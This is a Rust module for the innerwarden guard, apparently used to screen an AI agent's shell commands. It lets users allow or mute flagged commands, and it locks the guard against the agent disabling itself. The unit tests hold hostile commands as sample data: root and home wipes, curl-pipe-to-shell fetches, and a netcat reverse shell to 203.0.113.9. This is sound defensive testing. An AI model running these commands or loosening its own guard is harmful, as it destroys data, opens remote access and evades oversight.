//! User suppression - the "stop bugging me about this" layer.
//!
//! A guardrail that cries wolf and cannot be quieted gets uninstalled. So the user
//! can, locally and immediately (no upgrade), tell the guard to stand down on
//! things they trust, at four granularities:
//!   - an exact command or a glob (`tar czf *`)  -> `innerwarden allow`
//!   - an ATR rule id (`ATR-2026-051`)           -> `innerwarden mute`
//!   - an ATR category (`privilege-escalation`)  -> `innerwarden mute`
//!
//! Applied AFTER the deterministic rules but BEFORE the LLM second opinion and the
//! notification, so a suppressed command neither escalates (no cost) nor alerts.
//! Safety: an `allow` is an explicit user trust and forces `allow`. A `mute` only
//! downgrades to `allow` when EVERY reason the verdict flagged is muted - if any
//! non-muted danger signal remains (e.g. a base `download_and_execute`), the
//! verdict stands. Muting can never silently clear a command that still has an
//! un-muted reason to worry. All of this is pure and unit-tested.

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

/// The user's suppression config (TOML).
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct SuppressConfig {
    /// Command glob patterns that are force-allowed.
    #[serde(default)]
    pub allow: Vec<String>,
    /// ATR rule ids whose match no longer counts against a command.
    #[serde(default)]
    pub mute_rules: Vec<String>,
    /// ATR categories whose match no longer counts.
    #[serde(default)]
    pub mute_categories: Vec<String>,
}

impl SuppressConfig {
    /// The config a file holds, as it is applied, and what to tell the person
    /// about it.
    ///
    /// An allow pattern that matches every command ([`is_universal_pattern`])
    /// is dropped: it would switch screening off for everything, which is what
    /// `innerwarden dry-run` is for, and a file is easier to write than a
    /// command is to run. Any other pattern loads; one with no literal command
    /// word ([`is_unanchored_pattern`], `* | bash`, `c*`) loads with a warning,
    /// because it matches commands the person never wrote down and so lifts
    /// only a review, never a refusal or a floor signal (see [`apply`]).
    pub fn load(s: &str) -> (SuppressConfig, Vec<String>) {
        let mut cfg: SuppressConfig = toml::from_str(s).unwrap_or_default();
        let mut warnings = Vec::new();
        cfg.allow.retain(|pattern| {
            if is_universal_pattern(pattern) {
                warnings.push(format!(
                    "allow pattern {pattern:?} ignored: it matches every command, which would \
                     switch screening off. To stop blocking, use `innerwarden dry-run`."
                ));
                false
            } else {
                true
            }
        });
        for pattern in cfg.allow.iter().filter(|p| is_unanchored_pattern(p)) {
            warnings.push(format!(
                "allow pattern {pattern:?} has no literal start, so it matches commands you \
                 never wrote down. It still lifts a command held for review, but never a \
                 refused one, nor one that fetches and runs code, hides what it runs, installs \
                 persistence or a look-alike package, or turns the guard off. Name the command \
                 (its first word written out) instead."
            ));
        }
        (cfg, warnings)
    }
    pub fn to_toml(&self) -> String {
        toml::to_string_pretty(self).unwrap_or_default()
    }
}

/// Minimal glob match: `*` matches any (possibly empty) run of characters; every
/// other character is literal. No pattern (no `*`) means an exact-string match.
/// Pure.
pub fn glob_match(pattern: &str, text: &str) -> bool {
    let parts: Vec<&str> = pattern.split('*').collect();
    if parts.len() == 1 {
        return pattern == text; // no wildcard -> exact
    }
    let mut pos = 0usize;
    for (i, part) in parts.iter().enumerate() {
        if part.is_empty() {
            continue;
        }
        if i == 0 {
            if !text[pos..].starts_with(part) {
                return false;
            }
            pos += part.len();
        } else if i == parts.len() - 1 {
            // last non-empty part must be a suffix at/after pos
            return text[pos..].ends_with(part);
        } else {
            match text[pos..].find(part) {
                Some(idx) => pos += idx + part.len(),
                None => return false,
            }
        }
    }
    true
}

/// A pattern that matches every command: nothing but `*`.
pub fn is_universal_pattern(pattern: &str) -> bool {
    let pattern = pattern.trim();
    !pattern.is_empty() && pattern.chars().all(|c| c == '*')
}

/// A pattern with no literal command word: its first word (up to the first
/// space) holds a `*`. `* | bash` matches any command that merely ends that
/// way, and `c*` any command starting with that letter, which together with
/// a few more is every command. `tar czf *` and `curl -fsSL https://x*` name
/// their command and are anchored.
pub fn is_unanchored_pattern(pattern: &str) -> bool {
    pattern
        .split_whitespace()
        .next()
        .is_none_or(|word| word.contains('*'))
}

/// The signal the guard raises when the command would loosen the guard
/// itself. No allow rule lifts it.
const SELF_DISABLE_SIGNAL: &str = "guard_self_disable";

/// Whether an allow `pattern` may lift `verdict`.
///
/// Never when the verdict carries the self-disable signal: an allow rule
/// that matched `innerwarden allow ...` or a write into the guard's own
/// configuration would let the agent widen the list itself. And never, for
/// an unanchored pattern, when the verdict is a refusal (`deny`) or carries a
/// charged floor signal (`AGENT_REVIEW_FLOOR`): `* | bash` was written for one
/// command and matches every fetch-and-run, every `rm -rf ... | bash`; an
/// unanchored pattern lifts only a review. A pattern that names its command
/// keeps lifting a deny or a floor block, as it always has.
fn allow_may_lift(pattern: &str, verdict: &Value) -> bool {
    let charged = |name: &str| {
        verdict
            .get("signals")
            .and_then(|s| s.as_array())
            .is_some_and(|signals| {
                signals.iter().any(|s| {
                    s.get("signal").and_then(|n| n.as_str()) == Some(name)
                        && s.get("score")
                            .and_then(|n| n.as_u64())
                            .is_none_or(|score| score > 0)
                })
            })
    };
    if charged(SELF_DISABLE_SIGNAL) {
        return false;
    }
    if !is_unanchored_pattern(pattern) {
        return true;
    }
    let refused = verdict.get("recommendation").and_then(|r| r.as_str()) == Some("deny");
    !refused
        && !innerwarden_agent_guard::mcp::AGENT_REVIEW_FLOOR
            .iter()
            .any(|floor| charged(floor))
}

/// The verdict when a command is suppressed by an explicit user rule.
fn user_allow(verdict: &Value, reason: &str) -> Value {
    let mut out = verdict.clone();
    if let Some(obj) = out.as_object_mut() {
        obj.insert("recommendation".into(), json!("allow"));
        obj.insert("decided_by".into(), json!("user"));
        let base = verdict
            .get("explanation")
            .and_then(|e| e.as_str())
            .unwrap_or("");
        obj.insert(
            "explanation".into(),
            json!(format!("{base} [suppressed: {reason}]").trim()),
        );
    }
    out
}

/// Apply user suppression to a rules verdict. Returns an overriding `allow` verdict
/// (`decided_by = user`) when the command is force-allowed or fully muted, else
/// `None` to keep the original verdict. Pure/tested.
pub fn apply(command: &str, verdict: &Value, cfg: &SuppressConfig) -> Option<Value> {
    // 1. Explicit allow-list: the user trusts this command pattern. A pattern
    // that matches every command never gets here (`load` drops it), and one
    // that matches is still held to `allow_may_lift`.
    if let Some(pat) = cfg
        .allow
        .iter()
        .filter(|p| !is_universal_pattern(p))
        .find(|p| glob_match(p, command) && allow_may_lift(p, verdict))
    {
        return Some(user_allow(verdict, &format!("allow {pat}")));
    }
    // 2. Mute: only relevant for a flagged verdict with mutes configured.
    let rec = verdict.get("recommendation").and_then(|r| r.as_str());
    if !matches!(rec, Some("deny") | Some("review")) {
        return None;
    }
    if cfg.mute_rules.is_empty() && cfg.mute_categories.is_empty() {
        return None;
    }
    let muted_cat = |c: &str| cfg.mute_categories.iter().any(|m| m == c);
    let muted_rule = |r: &str| cfg.mute_rules.iter().any(|m| m == r);

    // Every ATR match must be muted (by rule id or category)...
    let atr = verdict
        .get("atr_matches")
        .and_then(|a| a.as_array())
        .cloned()
        .unwrap_or_default();
    let mut matched_mutes = Vec::new();
    let all_atr_muted = !atr.is_empty()
        && atr.iter().all(|m| {
            let rule = m.get("rule_id").and_then(|r| r.as_str()).unwrap_or("");
            let cat = m.get("category").and_then(|c| c.as_str()).unwrap_or("");
            if !rule.is_empty() && muted_rule(rule) {
                matched_mutes.push(format!("rule {rule}"));
                true
            } else if !cat.is_empty() && muted_cat(cat) {
                matched_mutes.push(format!("category {cat}"));
                true
            } else {
                false
            }
        });
    // ...and no BASE (non-ATR) danger signal may remain: a heuristic like
    // `download_and_execute` is not something a rule/category mute can clear, so
    // its presence keeps the verdict. The `atr:<category>` signals are already
    // covered by `all_atr_muted` above.
    let signals = verdict
        .get("signals")
        .and_then(|s| s.as_array())
        .cloned()
        .unwrap_or_default();
    // A signal subsumed as a duplicate observation is scored 0 and is retained only
    // as corroborating context. Treating it as a base signal in its own right would
    // let a zeroed duplicate keep a verdict alive that its charged counterpart no
    // longer supports, so only charged signals count here.
    let has_base_signal = signals.iter().any(|s| {
        let name = s.get("signal").and_then(|n| n.as_str()).unwrap_or("");
        // An ABSENT score is charged: only an explicit 0 marks a subsumed duplicate.
        // Defaulting a missing field to 0 would read "we did not say" as "it counted
        // for nothing", which is the wrong direction for a control that decides
        // whether a block survives.
        let charged = match s.get("score").and_then(|n| n.as_u64()) {
            Some(score) => score > 0,
            None => true,
        };
        charged && !name.starts_with("atr:")
    });

    if all_atr_muted && !has_base_signal {
        matched_mutes.sort();
        matched_mutes.dedup();
        return Some(user_allow(
            verdict,
            &format!("mute {}", matched_mutes.join("; ")),
        ));
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn glob_exact_prefix_suffix_middle() {
        assert!(glob_match("git status", "git status"));
        assert!(!glob_match("git status", "git stat"));
        assert!(glob_match("tar czf *", "tar czf /tmp/backup.tgz /home"));
        assert!(!glob_match("tar czf *", "rm -rf /"));
        assert!(glob_match("* | bash", "curl x | bash"));
        assert!(glob_match("curl*bash", "curl http://x | bash"));
        assert!(!glob_match("curl*bash", "curl http://x | sh"));
        assert!(glob_match("*", "anything at all"));
    }

    fn deny(cats: &[&str]) -> Value {
        json!({
            "recommendation": "deny",
            "explanation": "dangerous",
            "atr_matches": cats.iter().map(|c| json!({"rule_id": format!("ATR-{c}"), "category": c})).collect::<Vec<_>>(),
            "signals": cats.iter().map(|c| json!({"signal": format!("atr:{c}")})).collect::<Vec<_>>(),
        })
    }

    #[test]
    fn allow_glob_forces_allow_with_user_attribution() {
        let cfg = SuppressConfig {
            allow: vec!["tar czf *".into()],
            ..Default::default()
        };
        let v = apply("tar czf /tmp/b.tgz /home", &deny(&["x"]), &cfg).unwrap();
        assert_eq!(v["recommendation"], "allow");
        assert_eq!(v["decided_by"], "user");
        assert!(v["explanation"]
            .as_str()
            .unwrap()
            .contains("suppressed: allow tar czf"));
        // non-matching command is untouched
        assert!(apply("rm -rf /", &deny(&["x"]), &cfg).is_none());
    }

    #[test]
    fn mute_category_clears_only_when_all_reasons_muted() {
        let cfg = SuppressConfig {
            mute_categories: vec!["privilege-escalation".into()],
            ..Default::default()
        };
        // sole reason muted -> allowed
        let v = apply("chmod 777 x", &deny(&["privilege-escalation"]), &cfg).unwrap();
        assert_eq!(v["recommendation"], "allow");
        assert_eq!(v["decided_by"], "user");
        // a second, un-muted category remains -> verdict stands
        assert!(apply(
            "x",
            &deny(&["privilege-escalation", "tool-poisoning"]),
            &cfg
        )
        .is_none());
    }

    #[test]
    fn mute_rule_id_clears_by_rule() {
        let cfg = SuppressConfig {
            mute_rules: vec!["ATR-priv".into()],
            ..Default::default()
        };
        let verdict = apply("x", &deny(&["priv"]), &cfg).unwrap();
        assert!(verdict["recommendation"] == "allow");
        assert!(verdict["explanation"]
            .as_str()
            .unwrap()
            .contains("rule ATR-priv"));
    }

    #[test]
    fn mute_provenance_only_names_matches_that_caused_suppression() {
        let cfg = SuppressConfig {
            mute_rules: vec!["ATR-exact".into()],
            mute_categories: vec!["matched-category".into(), "unrelated-category".into()],
            ..Default::default()
        };
        let verdict = json!({
            "recommendation": "deny",
            "explanation": "dangerous",
            "atr_matches": [
                {"rule_id": "ATR-exact", "category": "other"},
                {"rule_id": "ATR-category", "category": "matched-category"}
            ],
            "signals": [
                {"signal": "atr:other"},
                {"signal": "atr:matched-category"}
            ]
        });

        let muted = apply("x", &verdict, &cfg).unwrap();
        let explanation = muted["explanation"].as_str().unwrap();
        assert!(explanation.contains("rule ATR-exact"));
        assert!(explanation.contains("category matched-category"));
        assert!(!explanation.contains("unrelated-category"));
    }

    #[test]
    fn mute_does_not_clear_a_base_danger_signal() {
        // deny driven by a BASE heuristic (download_and_execute), not an ATR rule:
        // muting a category must NOT clear it.
        let v = json!({
            "recommendation": "deny",
            "atr_matches": [{"rule_id": "ATR-x", "category": "tool-poisoning"}],
            "signals": [{"signal": "download_and_execute"}, {"signal": "atr:tool-poisoning"}],
        });
        let cfg = SuppressConfig {
            mute_categories: vec!["tool-poisoning".into()],
            ..Default::default()
        };
        assert!(
            apply("curl x | bash", &v, &cfg).is_none(),
            "base signal keeps the block"
        );
    }

    #[test]
    fn allow_and_review_untouched_without_config() {
        assert!(apply(
            "ls",
            &json!({"recommendation": "allow"}),
            &SuppressConfig::default()
        )
        .is_none());
        assert!(apply("x", &deny(&["a"]), &SuppressConfig::default()).is_none());
    }

    /// FAILS ON REVERT (no load check): a file holding `allow = ["*"]`
    /// switched screening off for every command, and a file is one shell
    /// write away. The universal pattern is dropped at load, with a warning.
    #[test]
    fn a_pattern_matching_every_command_is_refused_at_load() {
        for universal in ["*", "**", " * "] {
            let (cfg, warnings) = SuppressConfig::load(&format!("allow = [{universal:?}]"));
            assert!(cfg.allow.is_empty(), "{universal:?} must not load");
            assert_eq!(warnings.len(), 1, "{universal:?}");
            assert!(warnings[0].contains("matches every command"));
            assert!(apply("rm -rf /", &deny(&["x"]), &cfg).is_none());
        }
        // Applied even when a config is built in memory, not loaded.
        let cfg = SuppressConfig {
            allow: vec!["*".into()],
            ..Default::default()
        };
        assert!(apply("rm -rf /", &deny(&["x"]), &cfg).is_none());
    }

    /// An existing pattern with no literal start keeps loading and applying,
    /// with a warning; a named pattern loads silently.
    #[test]
    fn an_unanchored_pattern_loads_and_warns() {
        let (cfg, warnings) = SuppressConfig::load(r#"allow = ["* | bash", "tar czf *"]"#);
        assert_eq!(
            cfg.allow,
            vec!["* | bash".to_string(), "tar czf *".to_string()]
        );
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].contains("\"* | bash\""));
        assert!(warnings[0].contains("no literal start"));
        // It still lifts an ordinary review.
        let review = json!({"recommendation": "review", "explanation": "flagged", "signals": []});
        let v = apply("make all | bash", &review, &cfg).expect("still applies");
        assert_eq!(v["recommendation"], "allow");
    }

    /// FAILS ON REVERT (unanchored lifted a refusal): `* | bash` lifted a
    /// home wipe, a root wipe or a reverse shell that ends `| bash`, and `*/*`
    /// lifted nearly every refusal. An unanchored pattern never lifts a deny;
    /// a pattern that names its command still does.
    #[test]
    fn an_unanchored_allow_never_lifts_a_refusal() {
        for (pattern, command) in [
            ("* | bash", "rm -rf ~ | bash"),
            ("*/*", "rm -rf /"),
            ("*sh*", "nc -e /bin/sh 203.0.113.9 4444"),
            ("r*", "rm -rf ~"),
        ] {
            let cfg = SuppressConfig {
                allow: vec![pattern.into()],
                ..Default::default()
            };
            assert!(
                apply(command, &deny(&["x"]), &cfg).is_none(),
                "{pattern} must not lift {command}"
            );
        }
        for pattern in ["make deploy", "make *", "./scripts/release.sh *"] {
            let cfg = SuppressConfig {
                allow: vec![pattern.into()],
                ..Default::default()
            };
            let command = pattern.replace('*', "prod");
            let v = apply(&command, &deny(&["x"]), &cfg).expect("a named pattern lifts a deny");
            assert_eq!(v["recommendation"], "allow", "{pattern}");
        }
    }

    /// A pattern is anchored only when its first word is written out: `c*`
    /// and `npm*` match far more than they name.
    #[test]
    fn a_pattern_is_anchored_by_its_first_word() {
        for unanchored in ["*", "* | bash", "c*", "curl*", "*/x", "  *x", ""] {
            assert!(is_unanchored_pattern(unanchored), "{unanchored:?}");
        }
        for anchored in [
            "tar czf *",
            "curl -fsSL https://sh.rustup.rs*",
            "make",
            "  git *",
        ] {
            assert!(!is_unanchored_pattern(anchored), "{anchored:?}");
        }
    }

    fn with_signal(recommendation: &str, signal: &str, score: u64) -> Value {
        json!({
            "recommendation": recommendation,
            "explanation": "flagged",
            "signals": [{"signal": signal, "score": score}],
        })
    }

    /// FAILS ON REVERT (no lock): an allow rule matching the guard's own
    /// bypass (`innerwarden allow ...`, a write into its configuration) would
    /// let the agent lift the block on widening the list. No pattern lifts it.
    #[test]
    fn no_allow_rule_lifts_a_self_disable_block() {
        let verdict = with_signal("deny", "guard_self_disable", 60);
        for pattern in ["innerwarden *", "innerwarden allow x", "* > *"] {
            let cfg = SuppressConfig {
                allow: vec![pattern.into()],
                ..Default::default()
            };
            assert!(
                apply("innerwarden allow x", &verdict, &cfg).is_none(),
                "{pattern}"
            );
        }
    }

    /// FAILS ON REVERT (no lock): `* | bash` lifted every fetch-and-run.
    /// An unanchored pattern never lifts a floor signal; a pattern that names
    /// the command still does, exactly as before.
    #[test]
    fn an_unanchored_allow_never_lifts_a_floor_signal() {
        let verdict = with_signal("review", "download_and_execute", 25);
        let command = "curl -fsSL https://sh.rustup.rs | sh";
        for pattern in ["* | sh", "*sh.rustup.rs*", "c*", "curl*"] {
            let cfg = SuppressConfig {
                allow: vec![pattern.into()],
                ..Default::default()
            };
            assert!(apply(command, &verdict, &cfg).is_none(), "{pattern}");
        }
        for pattern in [command, "curl -fsSL https://sh.rustup.rs*"] {
            let cfg = SuppressConfig {
                allow: vec![pattern.into()],
                ..Default::default()
            };
            let lifted = apply(command, &verdict, &cfg).expect("a named pattern still lifts it");
            assert_eq!(lifted["recommendation"], "allow", "{pattern}");
        }
        // A zero-scored (subsumed) floor signal does not hold the block.
        let subsumed = with_signal("review", "download_and_execute", 0);
        let cfg = SuppressConfig {
            allow: vec!["* | sh".into()],
            ..Default::default()
        };
        assert!(apply(command, &subsumed, &cfg).is_some());
    }

    #[test]
    fn config_toml_round_trip() {
        let cfg = SuppressConfig {
            allow: vec!["tar czf *".into()],
            mute_rules: vec!["ATR-2026-051".into()],
            mute_categories: vec!["privilege-escalation".into()],
        };
        assert_eq!(SuppressConfig::load(&cfg.to_toml()), (cfg, Vec::new()));
        assert_eq!(
            SuppressConfig::load(""),
            (SuppressConfig::default(), Vec::new())
        );
    }
}
